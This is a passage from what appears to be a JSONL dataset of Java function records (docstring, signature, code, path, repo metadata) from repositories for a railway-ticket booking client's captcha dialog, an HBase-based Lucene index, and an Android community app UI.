2;\n\t\t\tgbc_lblSeatType.gridy = 4;\n\t\t\tpanel.add(lblSeatType, gbc_lblSeatType);\n\t\t}\n\t\t{\n\t\t\tJLabel lblNewLabel_5 = new JLabel(\"\u9a8c\u8bc1\u7801\uff1a\");\n\t\t\tlblNewLabel_5.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblNewLabel_5 = new GridBagConstraints();\n\t\t\tgbc_lblNewLabel_5.anchor = GridBagConstraints.EAST;\n\t\t\tgbc_lblNewLabel_5.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblNewLabel_5.gridx = 0;\n\t\t\tgbc_lblNewLabel_5.gridy = 5;\n\t\t\tpanel.add(lblNewLabel_5, gbc_lblNewLabel_5);\n\t\t}\n\t\t{\n\t\t\ttextSubmitCode = new JTextField();\n\t\t\tGridBagConstraints gbc_textSubmitCode = new GridBagConstraints();\n\t\t\tgbc_textSubmitCode.fill = GridBagConstraints.HORIZONTAL;\n\t\t\tgbc_textSubmitCode.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_textSubmitCode.gridx = 2;\n\t\t\tgbc_textSubmitCode.gridy = 5;\n\t\t\tpanel.add(textSubmitCode, gbc_textSubmitCode);\n\t\t\ttextSubmitCode.setColumns(10);\n\t\t\ttextSubmitCode.addKeyListener(new KeyAdapter() {\n\t\t\t\t@Override\n\t\t\t\tpublic void keyReleased(KeyEvent e) {\n\t\t\t\t\ttextSubmitCode.setText(textSubmitCode.getText().toUpperCase());\n\t\t\t\t\tString submitCode = textSubmitCode.getText();\n\t\t\t\t\tif (submitCode.length() == 4) {\n\t\t\t\t\t\tbtnSubmit.doClick();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\t\t{\n\t\t\tlblSubmitCodeImg = new JLabel(\"\");\n\t\t\tlblSubmitCodeImg.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tlblSubmitCodeImg.addMouseListener(new MouseAdapter() {\n\t\t\t\t@Override\n\t\t\t\tpublic void mouseClicked(MouseEvent e) {\n\t\t\t\t\trefreshSubmitCodeImage();\n\t\t\t\t}\n\t\t\t});\n\t\t\tGridBagConstraints gbc_lblSubmitCodeImg = new GridBagConstraints();\n\t\t\tgbc_lblSubmitCodeImg.insets = new Insets(0, 0, 5, 0);\n\t\t\tgbc_lblSubmitCodeImg.anchor = GridBagConstraints.WEST;\n\t\t\tgbc_lblSubmitCodeImg.gridx = 3;\n\t\t\tgbc_lblSubmitCodeImg.gridy = 5;\n\t\t\tpanel.add(lblSubmitCodeImg, gbc_lblSubmitCodeImg);\n\t\t}\n\t\t{\n\t\t\tJLabel lblNewLabel_2 = new JLabel(\"\u8f93\u5165\u56db\u4f4d\u9a8c\u8bc1\u7801\u540e\u81ea\u52a8\u63d0\u4ea4\");\n\t\t\tlblNewLabel_2.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblNewLabel_2 = new GridBagConstraints();\n\t\t\tgbc_lblNewLabel_2.fill = GridBagConstraints.HORIZONTAL;\n\t\t\tgbc_lblNewLabel_2.insets = new Insets(0, 0, 0, 5);\n\t\t\tgbc_lblNewLabel_2.gridx = 2;\n\t\t\tgbc_lblNewLabel_2.gridy = 6;\n\t\t\tpanel.add(lblNewLabel_2, gbc_lblNewLabel_2);\n\t\t}\n\t}\n\t{\n\t\tJPanel buttonPane = new JPanel();\n\t\tbuttonPane.setLayout(new FlowLayout(FlowLayout.RIGHT));\n\t\tgetContentPane().add(buttonPane, BorderLayout.SOUTH);\n\t\t{\n\t\t\tbtnSubmit = new JButton(\"\u63d0\u4ea4\");\n\t\t\tbtnSubmit.addActionListener(new ActionListener() {\n\t\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\t\tdoSubmitCode();\n\t\t\t\t\tdialog.setVisible(false);\n\t\t\t\t\tdialog.dispose();\n\t\t\t\t}\n\t\t\t});\n\t\t\tbuttonPane.add(btnSubmit);\n\t\t\tgetRootPane().setDefaultButton(btnSubmit);\n\t\t}\n\t\t{\n\t\t\tJButton cancelButton = new JButton(\"\u53d6\u6d88\");\n\t\t\tcancelButton.addActionListener(new ActionListener() {\n\t\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\t\ttextSubmitCode.setText(\"\");\n\t\t\t\t\tdoSubmitCode();\n\t\t\t\t\tdialog.setVisible(false);\n\t\t\t\t\tdialog.dispose();\n\t\t\t\t}\n\t\t\t});\n\t\t\tbuttonPane.add(cancelButton);\n\t\t}\n\t}\n\t{\n\t\tJPanel panel = new JPanel();\n\t\tgetContentPane().add(panel, BorderLayout.NORTH);\n\t\tpanel.setLayout(new GridLayout(0, 1, 0, 0));\n\t\t{\n\t\t\tJLabel lblNewLabel = new JLabel(\"\u5237\u5230\u7968\u4e86\uff0c\u8d76\u5feb\u8f93\u5165\u4e0b\u5355\u9a8c\u8bc1\u7801\uff0c\u5426\u5219\u673a\u4f1a\u8f6c\u77ac\u5373\u901d\");\n\t\t\tlblNewLabel.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 18));\n\t\t\tlblNewLabel.setForeground(Color.RED);\n\t\t\tpanel.add(lblNewLabel);\n\t\t}\n\t}\n\n\ttextSubmitCode.grabFocus();\n\n\tsetLocationByPlatform(true);\n\tsetDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);\n\tsetVisible(true);\n}", "path": "src\\main\\java\\lab\\ticket\\view\\RandomCodeDialog.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u7ed1\u5b9aUI\u6570\u636e\u5230\u6a21\u578b\u5bf9\u8c61\n * @return\n */\n", "func_signal": "private TicketData bindUItoModel()", "code": "{\n\tTicketData ticketData = new TicketData();\n\tticketData.setTrainFrom(textTrainFrom.getText());\n\tticketData.setTrainTo(textTrainTo.getText());\n\tticketData.setPrimaryTrainDate(textPrimaryTrainDate.getText());\n\tticketData.setExtraTrainDates(textExtraTrainDates.getText());\n\tfor (Component component : userPanelContainer.getComponents()) {\n\t\tticketData.getUserDatas().add(((UserPanel) component).bindUItoModel());\n\t}\n\tfor (Component component : passengerPanelContainer.getComponents()) {\n\t\tticketData.getPassengerDatas().add(((PassengerPanel) component).bindUItoModel());\n\t}\n\treturn ticketData;\n}", "path": "src\\main\\java\\lab\\ticket\\TicketMainFrame.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Directly skip to a given term.\n * \n * @param t\n * @throws IOException\n */\n", "func_signal": "public void skipTo(Term t) throws IOException", "code": "{\n  if (this.resultScanner != null) {\n    this.resultScanner.close();\n  }\n  Scan scan = new Scan();\n  scan.addFamily(HBaseneConstants.FAMILY_TERMVECTOR);\n  scan.setStartRow(Bytes.toBytes(t.field() + \"/\" + t.text()));\n  this.resultScanner = this.table.getScanner(scan);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseTermEnum.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Convert the given OpenBitSet to a serialized byte array.\n * @param bitset\n * @return Bytes representation of the OpenBitSet under consideration\n */\n", "func_signal": "public static byte[] toBytes(final OpenBitSet bitset)", "code": "{ \n  long [] bits = bitset.getBits();\n  int wlen = bitset.getNumWords();\n  byte[] output = new byte[wlen * Bytes.SIZEOF_LONG];\n  for (int i = 0; i < wlen; ++i) {\n    Bytes.putBytes(output, i * Bytes.SIZEOF_LONG, Bytes.toBytes(bits[i]), 0, Bytes.SIZEOF_LONG);\n  }\n  return output;\n}", "path": "src\\main\\java\\org\\hbasene\\index\\util\\HBaseneUtil.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * @throws java.lang.Exception\n */\n", "func_signal": "@Override\npublic void tearDown() throws Exception", "code": "{\n  LOGGER.info(\"***   Shut down the HBase Cluster  ****\");\n  // this.tablePool.close();\n  // TODO: HBASE-2435\n  HBaseIndexStore.dropLuceneIndexTable(TEST_INDEX, conf);\n  this.indexReader.close();\n  // TODO: Release indexWriter resources.\n  super.tearDown();\n}", "path": "src\\test\\java\\org\\hbasene\\index\\AbstractHBaseneTest.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "//private final BlockingQueue<Put> queuePuts;\n", "func_signal": "public TermVectorPutTask(final String[] inputTerms, int low, int high,\n    final ConcurrentHashMap<String, Object> termVectorMap,\n    final long docBase, final BlockingQueue<Put> queuePuts)", "code": "{\n  //this.inputTerms = inputTerms;\n  //this.low = low;\n  //this.high = high;\n  this.termVectorMap = termVectorMap;\n  this.docBase = docBase;\n  //this.queuePuts = queuePuts;\n}", "path": "src\\main\\java\\org\\hbasene\\index\\TermVectorPutTask.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/*\n * Read xml file of indexing configurations. The xml format is similar to\n * hbase-default.xml and hadoop-default.xml. For an example configuration, see\n * the <code>createIndexConfContent</code> method in TestTableIndex\n * \n * @param fileName File to read.\n * \n * @return XML configuration read from file\n * \n * @throws IOException\n */\n", "func_signal": "private String readContent(String fileName) throws IOException", "code": "{\n  File file = new File(fileName);\n  int length = (int) file.length();\n  if (length == 0) {\n    printUsage(\"Index configuration file \" + fileName + \" does not exist\");\n  }\n\n  int bytesRead = 0;\n  byte[] bytes = new byte[length];\n  FileInputStream fis = new FileInputStream(file);\n\n  try {\n    // read entire file into content\n    while (bytesRead < length) {\n      int read = fis.read(bytes, bytesRead, length - bytesRead);\n      if (read > 0) {\n        bytesRead += read;\n      } else {\n        break;\n      }\n    }\n  } finally {\n    fis.close();\n  }\n\n  return new String(bytes, 0, bytesRead, HConstants.UTF8_ENCODING);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\create\\mapred\\BuildTableIndex.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * @param args\n * @throws IOException\n */\n", "func_signal": "public static void main(String[] args) throws IOException", "code": "{\n  BuildTableIndex build = new BuildTableIndex();\n  build.run(args);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\create\\mapred\\BuildTableIndex.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Get a reference to the specified table from the pool.\n * <p>\n * \n * Create a new one if one is not available.\n * \n * @param tableName\n * @return a reference to the specified table\n * @throws RuntimeException\n *           if there is a problem instantiating the HTable\n */\n", "func_signal": "@Override\npublic HTable getTable(String tableName)", "code": "{\n  BlockingQueue<HTable> queue = tables.get(tableName);\n  if (queue == null) {\n    synchronized (tables) {\n      queue = tables.get(tableName);\n      if (queue == null) {\n        queue = new LinkedBlockingQueue<HTable>(this.maxSize);\n        for (int i = 0; i < this.maxSize; ++i) {\n          queue.add(this.newHTable(tableName));\n        }\n        tables.put(tableName, queue);\n      }\n    }\n  }\n  try {\n    return queue.take();\n  } catch (Exception ex) {\n    return null;\n  }\n}", "path": "src\\main\\java\\org\\hbasene\\index\\IndexHTablePool.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Create a table to store lucene indices, with the given name and the\n * configuration.\n * \n * @param tableName\n *          Name of the table to hold lucene indices.\n * @param configuration\n *          Configuration to hold HBase schema.\n * @param forceRecreate\n *          Drop any old table if it exists by the same name.\n * @return a valid HTable reference to the table of the name, if created\n *         successfully. <br>\n *         null, if table was not created successfully.\n * @throws IOException\n *           in case of any error with regard to the same.\n */\n", "func_signal": "public static HTable createLuceneIndexTable(final String tableName,\n    final HBaseConfiguration configuration, boolean forceRecreate)\n    throws IOException", "code": "{\n  HBaseAdmin admin = new HBaseAdmin(configuration);\n\n  if (admin.tableExists(tableName)) {\n    if (!forceRecreate) {\n      throw new IllegalArgumentException(\n          \"Table already exists by the index name \" + tableName);\n    } else {\n      doDropTable(admin, tableName);\n    }\n  }\n\n  HTableDescriptor tableDescriptor = new HTableDescriptor(Bytes\n      .toBytes(tableName));\n  tableDescriptor.addFamily(createUniversionLZO(admin, FAMILY_FIELDS));\n  tableDescriptor.addFamily(createUniversionLZO(admin, FAMILY_TERMVECTOR));\n  tableDescriptor\n      .addFamily(createUniversionLZO(admin, FAMILY_TERMFREQUENCIES));\n  tableDescriptor.addFamily(createUniversionLZO(admin, FAMILY_DOC_TO_INT));\n  tableDescriptor.addFamily(createUniversionLZO(admin, FAMILY_SEQUENCE));\n  tableDescriptor.addFamily(createUniversionLZO(admin, FAMILY_PAYLOADS));\n\n  admin.createTable(tableDescriptor);\n  HTableDescriptor descriptor = admin.getTableDescriptor(Bytes\n      .toBytes(tableName));\n\n  if (descriptor != null) {\n    HTable table = new HTable(configuration, tableName);\n\n    Put put2 = new Put(ROW_SEGMENT_ID);\n    put2.add(FAMILY_SEQUENCE, QUALIFIER_SEGMENT, Bytes.toBytes(-1L));\n    table.put(put2);\n\n    table.flushCommits();\n\n    return table;\n  } else {\n    return null;\n  }\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseIndexStore.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * @param tableName\n * @return HTable instance.\n * @deprecated Use createHTable\n */\n", "func_signal": "@Override\nprotected HTable newHTable(String tableName)", "code": "{\n  try {\n    HTable table = new HTable(conf, Bytes.toBytes(tableName));\n    table.setAutoFlush(false); // client throughput\n    return table;\n  } catch (IOException ioe) {\n    throw new RuntimeException(ioe);\n  }\n}", "path": "src\\main\\java\\org\\hbasene\\index\\IndexHTablePool.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Convert the given byte array to an open bitset.\n * @param bytes\n * @return Convert from bytes to OpenBitSet\n **/\n", "func_signal": "public static OpenBitSet toOpenBitSet(final byte[] bytes)", "code": "{\n  int wlen = bytes.length / Bytes.SIZEOF_LONG ;\n  if (wlen == 0) { \n    return null;\n  }\n  long [] bits = new long[wlen];\n  for (int i = 0; i < wlen ; ++i) {\n    bits[i] = Bytes.toLong(bytes, i * Bytes.SIZEOF_LONG);\n  }\n  return new OpenBitSet(bits, wlen);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\util\\HBaseneUtil.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * @throws java.lang.Exception\n */\n", "func_signal": "@Override\npublic void setUp() throws Exception", "code": "{\n  super.setUp();\n  // TEST_UTIL.startMiniCluster(1);\n  HBaseIndexStore.dropLuceneIndexTable(TEST_INDEX, conf);\n  HBaseIndexStore.createLuceneIndexTable(TEST_INDEX, conf, true);\n  this.tablePool = new HTablePool(conf, DEFAULT_POOL_SIZE);\n  HBaseIndexStore hbaseIndex = new HBaseIndexStore(this.tablePool, conf, TEST_INDEX);\n\n  this.indexWriter = new HBaseIndexWriter(hbaseIndex, PK_FIELD);\n  doInitDocs();\n\n  this.indexReader = new HBaseIndexReader(this.tablePool, TEST_INDEX,\n      PK_FIELD);\n  doSetupDerived();\n\n}", "path": "src\\test\\java\\org\\hbasene\\index\\AbstractHBaseneTest.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Puts the specified HTable back into the pool.\n * <p>\n * \n * If the pool already contains <i>maxSize</i> references to the table, then\n * nothing happens.\n * \n * @param table\n */\n", "func_signal": "@Override\npublic void putTable(HTable table)", "code": "{\n  BlockingQueue<HTable> queue = tables.get(Bytes.toString(table\n      .getTableName()));\n  try {\n    queue.put(table);\n  } catch (InterruptedException e) {\n    // TODO Auto-generated catch block\n    e.printStackTrace();\n  }\n}", "path": "src\\main\\java\\org\\hbasene\\index\\IndexHTablePool.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Index a given document.\n * \n * @param key\n * @param documentIndexContext\n * @return SegmentInfo that contains a segment id and a document id.\n * @throws IOException\n */\n", "func_signal": "public synchronized SegmentInfo indexDocument(final String key,\n    final DocumentIndexContext documentIndexContext) throws IOException", "code": "{\n  ++this.documentId;\n  final byte[] currentRow = this.getCurrentRow();\n  this.doAddTermVector(documentId, documentIndexContext.termPositionVectors\n      .keySet());\n  this.doAddTermFrequency(documentId,\n      documentIndexContext.termPositionVectors);\n  this.doStoreFields(currentRow, documentIndexContext.storeFields);\n  this.doStoreReverseMapping(key, currentRow);\n  SegmentInfo segmentInfo = new SegmentInfo(this.segmentId, this.documentId);\n  if (this.documentId == this.maxCommitDocs) {\n    doCommit();\n  }\n  return segmentInfo;\n\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseIndexStore.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Block and do not return until the job is complete.\n * \n * @param args\n * @throws IOException\n */\n", "func_signal": "public void run(String[] args) throws IOException", "code": "{\n  if (args.length < 6) {\n    printUsage(\"Too few arguments\");\n  }\n\n  int numMapTasks = 1;\n  int numReduceTasks = 1;\n  String iconfFile = null;\n  String indexDir = null;\n  String tableName = null;\n  StringBuilder columnNames = null;\n\n  // parse args\n  for (int i = 0; i < args.length - 1; i++) {\n    if (\"-m\".equals(args[i])) {\n      numMapTasks = Integer.parseInt(args[++i]);\n    } else if (\"-r\".equals(args[i])) {\n      numReduceTasks = Integer.parseInt(args[++i]);\n    } else if (\"-indexConf\".equals(args[i])) {\n      iconfFile = args[++i];\n    } else if (\"-indexDir\".equals(args[i])) {\n      indexDir = args[++i];\n    } else if (\"-table\".equals(args[i])) {\n      tableName = args[++i];\n    } else if (\"-columns\".equals(args[i])) {\n      columnNames = new StringBuilder(args[++i]);\n      while (i + 1 < args.length && !args[i + 1].startsWith(\"-\")) {\n        columnNames.append(\" \");\n        columnNames.append(args[++i]);\n      }\n    } else {\n      printUsage(\"Unsupported option \" + args[i]);\n    }\n  }\n\n  if (indexDir == null || tableName == null || columnNames == null) {\n    printUsage(\"Index directory, table name and at least one column must \"\n        + \"be specified\");\n  }\n\n  Configuration conf = new HBaseConfiguration();\n  if (iconfFile != null) {\n    // set index configuration content from a file\n    String content = readContent(iconfFile);\n    IndexConfiguration iconf = new IndexConfiguration();\n    // purely to validate, exception will be thrown if not valid\n    iconf.addFromXML(content);\n    conf.set(\"hbase.index.conf\", content);\n  }\n\n  if (columnNames != null) {\n    JobConf jobConf = createJob(conf, numMapTasks, numReduceTasks, indexDir,\n        tableName, columnNames.toString());\n    RunningJob runningJob = JobClient.runJob(jobConf);\n    runningJob.waitForCompletion();\n  }\n}", "path": "src\\main\\java\\org\\hbasene\\index\\create\\mapred\\BuildTableIndex.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "//private final int high;\n", "func_signal": "public TermVectorAppendTask(final String[] inputTerms, int low, int high,\n    final ConcurrentHashMap<String, Object> termVectorMap,\n    final int termVectorArrayThreshold, final long relativeId)", "code": "{\n  //this.inputTerms = inputTerms;\n  this.termVectorMap = termVectorMap;\n  //this.low = low;\n  //this.high = high;\n  this.termVectorArrayThreshold = termVectorArrayThreshold;\n  this.relativeId = relativeId;\n}", "path": "src\\main\\java\\org\\hbasene\\index\\TermVectorAppendTask.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Asserts if a mapping exists between the given term and the doc Id.\n * \n * @param term\n * @param docId\n * @throws IOException\n */\n", "func_signal": "protected void assertTermVectorDocumentMapping(final String term,\n    final long docId) throws IOException", "code": "{\n  byte[] internalDocId = Bytes.toBytes(docId);\n  Get get = new Get(Bytes.toBytes(term));\n  get.addFamily(HBaseneConstants.FAMILY_TERMVECTOR);\n  HTable table = new HTable(conf, TEST_INDEX);\n  try {\n    Result result = table.get(get);\n    NavigableMap<byte[], byte[]> map = result\n        .getFamilyMap(HBaseneConstants.FAMILY_TERMVECTOR);\n    Assert.assertTrue(map.size() > 0);\n    Assert.assertNotNull(map.get(internalDocId));\n  } finally {\n    table.close();\n  }\n}", "path": "src\\test\\java\\org\\hbasene\\index\\AbstractHBaseneTest.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * \n * @param tablePool\n *    TablePool to be used by the index reader\n * @param indexName\n *    Name of the index to be read from.  \n */\n", "func_signal": "public HBaseIndexReader(final HTablePool tablePool, final String indexName, final String primaryKeyField)", "code": "{\n  this.tablePool = tablePool;\n  this.indexName = indexName;\n  this.primaryKeyField = Bytes.toBytes(primaryKeyField);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseIndexReader.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * @param conf\n * @param numMapTasks\n * @param numReduceTasks\n * @param indexDir\n * @param tableName\n * @param columnNames\n * @return JobConf\n */\n", "func_signal": "public JobConf createJob(Configuration conf, int numMapTasks,\n    int numReduceTasks, String indexDir, String tableName, String columnNames)", "code": "{\n  JobConf jobConf = new JobConf(conf, BuildTableIndex.class);\n  jobConf.setJobName(\"build index for table \" + tableName);\n  jobConf.setNumMapTasks(numMapTasks);\n  // number of indexes to partition into\n  jobConf.setNumReduceTasks(numReduceTasks);\n\n  // use identity map (a waste, but just as an example)\n  IdentityTableMap.initJob(tableName, columnNames, IdentityTableMap.class,\n      jobConf);\n\n  // use IndexTableReduce to build a Lucene index\n  jobConf.setReducerClass(IndexTableReduce.class);\n  FileOutputFormat.setOutputPath(jobConf, new Path(indexDir));\n  jobConf.setOutputFormat(IndexOutputFormat.class);\n  jobConf.setJarByClass(BuildTableIndex.class);\n  return jobConf;\n}", "path": "src\\main\\java\\org\\hbasene\\index\\create\\mapred\\BuildTableIndex.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * \n * @param indexTransactionLog\n * @param primaryKeyField\n *          The primary key field of the lucene Document schema to be used.\n * @throws CorruptIndexException\n * @throws LockObtainFailedException\n * @throws IOException\n */\n", "func_signal": "public HBaseIndexWriter(final AbstractIndexStore indexTransactionLog,\n    final String primaryKeyField) throws IOException", "code": "{\n  // super(d, a, create, deletionPolicy, mfl);\n  // TODO: bring super ctor in when we inherit from IndexWriter.\n\n  this.indexStore = indexTransactionLog;\n  this.primaryKeyField = primaryKeyField;\n\n  // Reset the transaction Log.\n  // this.indexStore.init();\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseIndexWriter.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * Drop the given Lucene index table.\n * \n * @param tableName\n * @param configuration\n * @throws IOException\n */\n", "func_signal": "public static void dropLuceneIndexTable(final String tableName,\n    final HBaseConfiguration configuration) throws IOException", "code": "{\n  HBaseAdmin admin = new HBaseAdmin(configuration);\n  doDropTable(admin, tableName);\n}", "path": "src\\main\\java\\org\\hbasene\\index\\HBaseIndexStore.java", "repo_name": "akkumar/hbasene", "stars": 108, "license": "apache-2.0", "language": "java", "size": 10598}
{"docstring": "/**\n * clean sub fragment data</br>\n */\n", "func_signal": "public void cleanAdapterData()", "code": "{\n    if (mMainFeedFragment != null) {\n        mMainFeedFragment.clearListView();\n    }\n    if (mRecommendFragment != null) {\n        mRecommendFragment.cleanAdapterData();\n    }\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u68c0\u67e5\u5f53\u524d\u767b\u5f55\u7528\u6237\u662f\u5426\u5df2\u5173\u6ce8\u8be5\u8bdd\u9898\uff0c\u5e76\u8bbe\u7f6eToggleButton\u7684\u72b6\u6001</br>\n */\n", "func_signal": "private void setTopicStatus()", "code": "{\n    String loginUserId = CommConfig.getConfig().loginedUser.id;\n    if (TextUtils.isEmpty(loginUserId)) {\n        Log.d(\"###\", \"### user dont login...\");\n        return;\n    }\n    mFollowToggleBtn.setChecked(mTopic.isFocused);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\activities\\TopicDetailActivity.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * </br>\n * \n * @param pos\n * @return\n */\n", "func_signal": "private Fragment getFragment(int pos)", "code": "{\n    Fragment fragment = null;\n    if (pos == 0) {\n        fragment = mMainFeedFragment;\n    } else if (pos == 1) {\n        fragment = mRecommendFragment;\n    } else if (pos == 2) {\n        fragment = mTopicFragment;\n    }\n    return fragment;\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * @param context\n */\n", "func_signal": "public EmojiView(Context context, EmojiBean[] emojis)", "code": "{\n    super(context);\n    this.mEmojicons = emojis;\n    init();\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\emoji\\EmojiView.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u521d\u59cb\u5316ViewPager VIew</br>\n * \n * @param rootView\n */\n", "func_signal": "private void initViewPager(View rootView)", "code": "{\n    mViewPager = (ViewPager) rootView.findViewById(ResFinder.getId(\"viewPager\"));\n    mViewPager.setOffscreenPageLimit(mTitles.length);\n    CommFragmentPageAdapter adapter = new CommFragmentPageAdapter(getChildFragmentManager());\n    mViewPager.setAdapter(adapter);\n    mViewPager.setOnPageChangeListener(new OnPageChangeListener() {\n\n        @Override\n        public void onPageSelected(int page) {\n            mCurrentFragment = getFragment(page);\n            // mTitleTextView.selectItemWithIndex(page);\n            mSegmentView.selectItemIndex(page);\n        }\n\n        @Override\n        public void onPageScrolled(int arg0, float arg1, int arg2) {\n\n        }\n\n        @Override\n        public void onPageScrollStateChanged(int arg0) {\n\n        }\n    });\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u521d\u59cb\u5316Fragment</br>\n */\n", "func_signal": "private void initFragment()", "code": "{\n    mMainFeedFragment = new AllFeedsFragment();\n    mRecommendFragment = new RecommendFeedFragment();\n    mTopicFragment = TopicFragment.newTopicFragment();\n    mCurrentFragment = mMainFeedFragment;// \u9ed8\u8ba4\u662fMainFeedFragment\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "//\u3010\u6b64\u65f6\u5728\u4e0b\u62c9\u5237\u65b0\uff0c\u7136\u540e\u7acb\u5373\u6ed1\u52a8\u5230\u5e95\u90e8\u52a0\u8f7d\u66f4\u591a\u53ef\u80fd\u51fa\u73b0\u95ee\u9898\u3011\n", "func_signal": "public LikeUserActivityPresenter(MvpLikeUserView view, String feedId)", "code": "{\n       mView = view;\n       mFeedId = feedId;\n   }", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\presenter\\impl\\LikeUserActivityPresenter.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u521d\u59cb\u5316title</br>\n * \n * @param context\n */\n", "func_signal": "private void initTitle(View rootView)", "code": "{\n    mTitles = getResources().getStringArray(\n            ResFinder.getResourceId(ResType.ARRAY, \"umeng_comm_feed_titles\"));\n    int titleLayoutResId = ResFinder.getId(\"topic_action_bar\");\n    mTitleLayout = rootView.findViewById(titleLayoutResId);\n    mTitleLayout.setVisibility(View.GONE);\n\n    int backButtonResId = ResFinder.getId(\"umeng_comm_back_btn\");\n    rootView.findViewById(backButtonResId).setOnClickListener(this);\n\n    if (mBackButtonVisible != View.VISIBLE) {\n        rootView.findViewById(backButtonResId).setVisibility(mBackButtonVisible);\n    }\n\n    mTitleLayout.setVisibility(mTitleVisible);\n\n    mBadgeView = findViewById(ResFinder.getId(\"umeng_comm_badge_view\"));\n    mBadgeView.setVisibility(View.INVISIBLE);\n    //\n    mProfileBtn = (ImageView) rootView\n            .findViewById(ResFinder.getId(\"umeng_comm_user_info_btn\"));\n    mProfileBtn.setOnClickListener(new LoginOnViewClickListener() {\n        @Override\n        protected void doAfterLogin(View v) {\n            if (mBadgeView != null) {\n                mBadgeView.setVisibility(View.INVISIBLE);\n            }\n            gotoFindActivity(CommConfig.getConfig().loginedUser);\n        }\n    });\n\n    mSegmentView = (SegmentView) rootView.findViewById(ResFinder\n            .getId(\"umeng_comm_segment_view\"));\n    // \u8bbe\u7f6etabs\n    mSegmentView.setTabs(mTitles);\n    mSegmentView.selectItemIndex(0);\n    // \u8bbe\u7f6e\u70b9\u51fb\u4e8b\u4ef6\n    mSegmentView.setOnItemCheckedListener(new OnItemCheckedListener() {\n\n        @Override\n        public void onCheck(RadioButton button, int position, String title) {\n            mViewPager.setCurrentItem(position, 